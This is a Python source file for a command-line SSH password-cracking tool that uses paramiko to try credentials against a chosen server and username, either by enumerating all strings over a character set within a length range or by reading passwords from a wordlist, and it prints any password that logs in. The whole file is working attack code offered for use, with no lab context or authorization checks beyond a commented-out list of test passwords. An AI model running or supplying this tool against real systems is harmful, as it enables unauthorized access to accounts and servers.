import argparse
import paramiko
import itertools
import string
import time
import signal
import sys

def signal_handler(sig, frame):
    print('\n[!] Signal received. Exiting gracefully.')
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)  # Handle Ctrl+C (SIGINT)

def brute_force_ssh(username, server, charset, min_length, max_length):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    for length in range(min_length, max_length + 1):
        for password in itertools.product(charset, repeat=length):
            password = ''.join(password)
            print(password)
            try:
                time.sleep(3)
                client.connect(server, username=username, password=password, timeout=6000)
                print(f"Password found: {password}")
                client.close()
                return password
            except paramiko.AuthenticationException:
                client.close()
                continue
            except Exception as e:
                print(f"Error: {e}")
                return None

    print("Password not found.")
    return None

def dictionary_attack(username, server, wordlist):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    with open(wordlist, 'r', encoding='utf-8', errors='ignore') as file:
        for line in file:
        # for password in ['hallo', '12345', 'kali']:
            password = line.strip()
            # password = password.strip()
            print(password)
            try:
                time.sleep(3)
                client.connect(server, username=username, password=password)
                print(f"Password found: {password}")
                client.close()
                return password
            except paramiko.AuthenticationException:
                client.close()
                continue
            except Exception as e:
                print(f"Error: {e}")
                return None

    print("Password not found.")
    return None

def main():
    parser = argparse.ArgumentParser(description="SSH Brute Force and Dictionary Attack Tool")
    parser.add_argument('-u', '--username', required=True, help="Username for SSH login")
    parser.add_argument('-s', '--server', required=True, help="Server IP or DNS for SSH login")
    parser.add_argument('-w', '--wordlist', help="Wordlist for dictionary attack")
    parser.add_argument('--min', type=int, default=4, help="Minimum length of passwords for brute force (default: 4)")
    parser.add_argument('--max', type=int, default=8, help="Maximum length of passwords for brute force (default: 8)")
    parser.add_argument('-c', '--charset', default=string.ascii_lowercase, help="Charset for brute force attack (default: lowercase letters)")

    args = parser.parse_args()

    if args.wordlist:
        dictionary_attack(args.username, args.server, args.wordlist)
    else:
        brute_force_ssh(args.username, args.server, args.charset, args.min, args.max)

if __name__ == "__main__":
    main()